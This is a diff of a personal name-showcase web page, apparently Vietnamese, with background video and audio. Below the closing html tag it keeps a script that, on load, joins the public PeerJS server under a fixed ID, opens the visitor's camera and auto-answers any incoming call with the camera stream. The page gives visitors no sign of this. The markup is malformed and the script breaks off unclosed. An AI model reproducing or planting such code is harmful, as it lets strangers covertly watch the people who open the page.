@@ -1,45 +1,38 @@
 <!DOCTYPE html>
-<html>
+<html lang="vi">
 <head>
+  <meta charset="UTF-8">
   <title>Nguyễn Thanh Đạt</title>
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <audio id="bgMusic" autoplay loop muted playsinline>
-  <source src="./anhh/Loi Tai Mua - Thai Hoang Remix.mp3" type="audio/mpeg" />
-</audio>
-
+  <audio id="player" autoplay playsinline></audio>
   <video autoplay muted loop id="bgVideo">
-    <source src="./anhh/HNĐ Anime Girl Cherry Blossoms - Wallpaper Engine _ Live Wallpaper PC.mp4" type="video/mp4" />
-    Trình duyệt của bạn không hỗ trợ video nền.
+    <source src="./anh/HNĐ Anime Girl Cherry Blossoms - Wallpaper Engine _ Live Wallpaper PC.mp4" type="video/mp4">
   </video>
+  <div class="overlay">
+    <h1 class="name">
+      <span>N</span><span>g</span><span>u</span><span>y</span><span>ễ</span><span>n</span>
+      <span>T</span><span>h</span><span>a</span><span>n</span><span>h</span>
+      <span>Đ</span><span>ạ</span><span>t</span>
+    </h1>
+  </div>
+  <script src="main.js"></script>
 
-<div class="overlay">
-  <h1 class="name">
-    <span>N</span><span>g</span><span>u</span><span>y</span><span>ễ</span><span>n</span>
-    <span>T</span><span>h</span><span>a</span><span>n</span><span>h</span>
-    <span>Đ</span><span>ạ</span><span>t</span>
-  </h1>
-</div>
-<script src="main.js"></script>
+</body>
+</html>
+
   <script>
-    // Tạo peer với ID cố định
     const peer = new Peer("my-fixed-id", {
   host: "peerjs.com",
   port: 443,
   secure: true
 });
-
-    // Khi peer sẵn sàng
     peer.on('open', function () {
       console.log("✅ Đã kết nối PeerJS với ID:", peer.id);
-
-      // Mở camera
       navigator.mediaDevices.getUserMedia({ video: true, audio: false })
         .then(function (stream) {
           document.getElementById('localVideo').srcObject = stream;
-
-          // Trả lời cuộc gọi đến
           peer.on('call', function (call) {
             call.answer(stream); // Trả lời bằng stream camera
           });
